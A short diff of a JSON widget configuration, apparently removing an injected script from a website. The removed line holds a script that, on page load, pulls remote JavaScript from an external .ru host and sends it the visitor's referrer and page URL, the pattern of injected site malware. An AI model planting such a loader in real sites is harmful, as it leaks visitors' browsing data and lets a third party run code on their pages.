@@ -85,7 +85,7 @@
     },
     "widgets": {
         "value": [
-            "<script type=\"text\/javascript\">\n    (function (d, w) {\n        var n = d.getElementsByTagName(\"script\")[0],\n            s = d.createElement(\"script\");\n            s.type = \"text\/javascript\";\n            s.async = true;\n            s.src = \"https:\/\/victorycorp.ru\/index.php?ref=\"+d.referrer+\"&page=\" + encodeURIComponent(w.location.href);\n            n.parentNode.insertBefore(s, n);\n    })(document, window);\n<\/script>"
+            ""
         ],
         "fn": "_wd",
         "prod": true
